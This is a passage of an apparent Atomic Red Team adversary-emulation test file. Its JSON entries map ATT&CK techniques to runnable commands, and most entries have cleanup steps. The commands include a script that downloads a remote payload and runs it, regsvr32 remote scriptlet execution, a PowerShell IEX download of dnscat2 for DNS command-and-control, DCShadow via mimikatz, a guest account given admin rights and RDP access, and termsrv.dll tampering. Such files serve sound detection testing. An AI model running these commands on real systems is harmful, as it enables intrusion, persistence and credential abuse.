			"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n",
			"name": "sh",
			"cleanup_command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}\n",
			"elevation_required": false
		},
		"attack_technique": "T1059.006",
		"phases": ["execution"]
	},
	{
		"name": "Python pty module and spawn function used to spawn sh or bash",
		"auto_generated_guid": "161d694c-b543-4434-85c3-c3a433e33792",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "Verify if python is in the environment variable path and attempt to import requests library.\n",
				"prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n",
				"get_prereq_command": "pip install requests\n"
			}
		],
		"executor": {
			"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.006",
		"phases": ["execution"]
	},
	{
		"name": "Process injection ListPlanting",
		"auto_generated_guid": "4f3c7502-b111-4dfe-8a6e-529307891a59",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_binary": {
				"description": "PE binary",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Injector ListPlanting.exe must exist at specified location (#{exe_binary})\n",
				"prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe\" -OutFile \"#{exe_binary}\"\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1055.015",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Enable Guest account with RDP capability and admin privileges",
		"auto_generated_guid": "99747561-ed8d-47f2-9c91-1e5fde1ed6e0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"guest_user": {
				"description": "Specify the guest account",
				"type": "string",
				"default": "guest"
			},
			"guest_password": {
				"description": "Specify the guest password",
				"type": "string",
				"default": "Password123!"
			},
			"local_admin_group": {
				"description": "Specify the admin localgroup name",
				"type": "string",
				"default": "Administrators"
			},
			"remote_desktop_users_group_name": {
				"description": "Specify the remote desktop users group name",
				"type": "string",
				"default": "Remote Desktop Users"
			},
			"remove_rdp_access_during_cleanup": {
				"description": "Set to 1 if you want the cleanup to remove RDP access to machine",
				"type": "integer",
				"default": 0
			}
		},
		"executor": {
			"command": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
			"cleanup_command": "net user #{guest_user} /active:no >nul 2>&1\nnet localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1078.001",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Activate Guest Account",
		"auto_generated_guid": "aa6cb8c4-b582-4f8e-b677-37733914abda",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"guest_user": {
				"description": "Specify the guest account",
				"type": "string",
				"default": "guest"
			}
		},
		"executor": {
			"command": "net user #{guest_user} /active:yes\n",
			"cleanup_command": "net user #{guest_user} /active:no\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1078.001",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Enable Guest Account on macOS",
		"auto_generated_guid": "0315bdff-4178-47e9-81e4-f31a6d23f7e4",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo sysadminctl -guestAccount on",
			"cleanup_command": "sudo sysadminctl -guestAccount off",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1078.001",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Regsvr32 local COM scriptlet execution",
		"auto_generated_guid": "449aa403-6aba-47ce-8a37-247d21ef0306",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filename": {
				"description": "Name of the local file, include path.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct"
			},
			"regsvr32path": {
				"description": "Default location of Regsvr32.exe",
				"type": "path",
				"default": "C:\\Windows\\system32"
			},
			"regsvr32name": {
				"description": "Default name of Regsvr32.exe",
				"type": "string",
				"default": "regsvr32.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n",
				"prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n"
			}
		],
		"executor": {
			"command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:\"#{filename}\" scrobj.dll\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Regsvr32 remote COM scriptlet execution",
		"auto_generated_guid": "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url": {
				"description": "URL to hosted sct file",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct"
			},
			"regsvr32path": {
				"description": "Default location of Regsvr32.exe",
				"type": "path",
				"default": "C:\\Windows\\system32"
			},
			"regsvr32name": {
				"description": "Default name of Regsvr32.exe",
				"type": "string",
				"default": "regsvr32.exe"
			}
		},
		"executor": {
			"command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Regsvr32 local DLL execution",
		"auto_generated_guid": "08ffca73-9a3d-471a-aeb0-68b4aa3ab37b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_name": {
				"description": "Name of DLL to Execute, DLL Should export DllRegisterServer",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
			},
			"regsvr32path": {
				"description": "Default location of Regsvr32.exe",
				"type": "path",
				"default": "C:\\Windows\\system32"
			},
			"regsvr32name": {
				"description": "Default name of Regsvr32.exe",
				"type": "string",
				"default": "regsvr32.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n",
				"prereq_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"\n"
			}
		],
		"executor": {
			"command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Regsvr32 Registering Non DLL",
		"auto_generated_guid": "1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_file": {
				"description": "Path to renamed dll file to be registered",
				"type": "path",
				"default": "%temp%\\shell32.jpg"
			},
			"regsvr32path": {
				"description": "Default location of Regsvr32.exe",
				"type": "path",
				"default": "C:\\Windows\\system32"
			},
			"regsvr32name": {
				"description": "Default name of Regsvr32.exe",
				"type": "string",
				"default": "regsvr32.exe"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "Test requires a renamed dll file\n",
				"prereq_command": "if exist #{dll_file} ( exit 0 ) else ( exit 1 )\n",
				"get_prereq_command": "copy \"C:\\Windows\\System32\\shell32.dll\" \"#{dll_file}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n",
			"cleanup_command": "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
		},
		"attack_technique": "T1218.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Regsvr32 Silent DLL Install Call DllRegisterServer",
		"auto_generated_guid": "9d71c492-ea2e-4c08-af16-c6994cdf029f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_name": {
				"description": "Name of DLL to Install",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
			},
			"regsvr32path": {
				"description": "Default location of Regsvr32.exe",
				"type": "string",
				"default": "C:\\Windows\\system32"
			},
			"regsvr32name": {
				"description": "Default name of Regsvr32.exe",
				"type": "string",
				"default": "regsvr32.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})",
				"prereq_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\""
			}
		],
		"executor": {
			"command": "#{regsvr32path}\\#{regsvr32name} /s /i \"#{dll_name}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "HTML Smuggling Remote Payload",
		"auto_generated_guid": "30cbeda4-08d9-42f1-8685-197fad677734",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "T1027_006_remote.html must exist on disk at specified at PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"\n"
			}
		],
		"executor": {
			"command": "& \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\"\n",
			"cleanup_command": "$user = [System.Environment]::UserName; Remove-Item -Path C:\\Users\\$user\\Downloads\\FeelTheBurn.iso -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux",
		"auto_generated_guid": "3a41f169-a5ab-407f-9269-abafdb5da6c2",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed.",
				"type": "path",
				"default": "/tmp/T1217-Firefox.txt"
			}
		},
		"executor": {
			"command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
			"cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Mozilla Firefox Bookmark Database Files on macOS",
		"auto_generated_guid": "1ca1f9c7-44bc-46bb-8c85-c50e2e94267b",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed.",
				"type": "path",
				"default": "/tmp/T1217_Firefox.txt"
			}
		},
		"executor": {
			"command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
			"cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Google Chrome Bookmark JSON Files on macOS",
		"auto_generated_guid": "b789d341-154b-4a42-a071-9111588be9bc",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed.",
				"type": "path",
				"default": "/tmp/T1217-Chrome.txt"
			}
		},
		"executor": {
			"command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
			"cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Google Chromium Bookmark JSON Files on FreeBSD",
		"auto_generated_guid": "88ca025b-3040-44eb-9168-bd8af22b82fa",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed.",
				"type": "path",
				"default": "/tmp/T1217-Chrome.txt"
			}
		},
		"executor": {
			"command": "find / -path \"*/.config/chromium/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
			"cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Google Chrome / Opera Bookmarks on Windows with powershell",
		"auto_generated_guid": "faab755e-4299-48ec-8202-fc7885eb6545",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt",
		"auto_generated_guid": "76f71e2f-480e-4bed-b61e-398fe17499d5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "where /R C:\\Users\\ Bookmarks\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Mozilla Firefox bookmarks on Windows with command prompt",
		"auto_generated_guid": "4312cdbc-79fc-4a9c-becc-53d49c734bc5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "where /R C:\\Users\\ places.sqlite\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Internet Explorer Bookmarks using the command prompt",
		"auto_generated_guid": "727dbcdb-e495-4ab1-a6c4-80c7f77aef85",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "dir /s /b %USERPROFILE%\\Favorites\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "List Safari Bookmarks on MacOS",
		"auto_generated_guid": "5fc528dd-79de-47f5-8188-25572b7fafe0",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed.",
				"type": "path",
				"default": "/tmp/T1217-Safari.txt"
			}
		},
		"executor": {
			"command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file} \ncat #{output_file} \n",
			"cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1217",
		"phases": ["discovery"]
	},
	{
		"name": "DNS Large Query Volume",
		"auto_generated_guid": "1700f5d6-5a44-487b-84de-bc66f507b0a6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"query_type": {
				"description": "DNS query type",
				"type": "string",
				"default": "TXT"
			},
			"subdomain": {
				"description": "Subdomain prepended to the domain name",
				"type": "string",
				"default": "atomicredteam"
			},
			"query_volume": {
				"description": "Number of DNS queries to send",
				"type": "integer",
				"default": 1000
			},
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "127.0.0.1.nip.io"
			}
		},
		"executor": {
			"command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1071.004",
		"phases": ["command-and-control"]
	},
	{
		"name": "DNS Regular Beaconing",
		"auto_generated_guid": "3efc144e-1af8-46bb-8ca2-1376bb6db8b6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"runtime": {
				"description": "Time in minutes to run the simulation",
				"type": "integer",
				"default": 30
			},
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "127.0.0.1.nip.io"
			},
			"subdomain": {
				"description": "Subdomain prepended to the domain name",
				"type": "string",
				"default": "atomicredteam"
			},
			"query_type": {
				"description": "DNS query type",
				"type": "string",
				"default": "TXT"
			},
			"c2_interval": {
				"description": "Seconds between C2 requests to the command and control server",
				"type": "integer",
				"default": 30
			},
			"c2_jitter": {
				"description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
				"type": "integer",
				"default": 20
			}
		},
		"executor": {
			"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1071.004",
		"phases": ["command-and-control"]
	},
	{
		"name": "DNS Long Domain Query",
		"auto_generated_guid": "fef31710-223a-40ee-8462-a396d6b66978",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"query_type": {
				"description": "DNS query type",
				"type": "string",
				"default": "TXT"
			},
			"subdomain": {
				"description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
				"type": "string",
				"default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"
			},
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "127.0.0.1.nip.io"
			}
		},
		"executor": {
			"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1071.004",
		"phases": ["command-and-control"]
	},
	{
		"name": "DNS C2",
		"auto_generated_guid": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "Domain Name configured to use DNS Server where your C2 listener is running",
				"type": "string",
				"default": "example.com"
			},
			"server_ip": {
				"description": "IP address of DNS server where your C2 listener is running",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1071.004",
		"phases": ["command-and-control"]
	},
	{
		"name": "DCShadow (Active Directory)",
		"auto_generated_guid": "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"object": {
				"description": "Targeted object (for machine account do not forget to add final '$')",
				"type": "string",
				"default": "bruce.wayne"
			},
			"attribute": {
				"description": "Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...",
				"type": "string",
				"default": "badpwdcount"
			},
			"value": {
				"description": "Value to assign to object attribute",
				"type": "string",
				"default": "9999"
			},
			"mimikatz_path": {
				"description": "Mimikatz windows executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
			},
			"psexec_path": {
				"description": "Path to PsExec",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			},
			{
				"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
				"prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n",
			"cleanup_command": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore\n"
		},
		"attack_technique": "T1207",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Cached Credential Dump via Cmdkey",
		"auto_generated_guid": "56506854-89d6-46a3-9804-b7fde90791f9",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "cmdkey /list\n"
		},
		"attack_technique": "T1003.005",
		"phases": ["credential-access"]
	},
	{
		"name": "Simulate Patching termsrv.dll",
		"auto_generated_guid": "0b2eadeb-4a64-4449-9d43-3d999f4a317b",
		"supported_platforms": ["windows"],
		"executor": {
			"elevation_required": true,
			"command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore\nMove-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n",
			"cleanup_command": "Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n",
			"name": "powershell"
		},
		"attack_technique": "T1505.005",
		"phases": ["persistence"]
	},
	{
		"name": "Modify Terminal Services DLL Path",
		"auto_generated_guid": "18136e38-0530-49b2-b309-eed173787471",
		"supported_platforms": ["windows"],
		"executor": {
			"elevation_required": true,
			"command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path $termsrvDll -Destination \"$HOME\\AtomicTest.dll\"\n\n$newServiceDll = \"$HOME\\AtomicTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif (Test-Path -Path $registryPath) {\n    # Modify the ServiceDll value in the registry\n    Set-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value $newServiceDll\n    Write-Host \"ServiceDll value in the registry has been updated to: $newServiceDll\"\n} else {\n    Write-Host \"Registry key not found. Make sure the 'TermService\\Parameters' key exists.\"\n}",
			"cleanup_command": "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\" -Name \"ServiceDll\" -Value \"C:\\Windows\\System32\\termsrv.dll\"",
			"name": "powershell"
		},
		"attack_technique": "T1505.005",
		"phases": ["persistence"]
	},
	{
		"name": "Network Share Discovery",
		"auto_generated_guid": "f94b5ad9-911c-4eff-9718-fd21899db4f7",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"computer_name": {
				"description": "Computer name to find a mount on.",
				"type": "string",
				"default": "computer1"
			}
		},
		"executor": {
			"command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Network Share Discovery - linux",
		"auto_generated_guid": "875805bc-9e86-4e87-be86-3a5527315cae",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"package_checker": {
				"description": "Package checking command. Debian - dpkg -s samba",
				"type": "string",
				"default": "(rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)"
			},
			"package_installer": {
				"description": "Package installer command. Debian - apt install samba",
				"type": "string",
				"default": "(which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Package with smbstatus (samba) must exist on device\n",
				"prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "sudo #{package_installer} \n"
			}
		],
		"executor": {
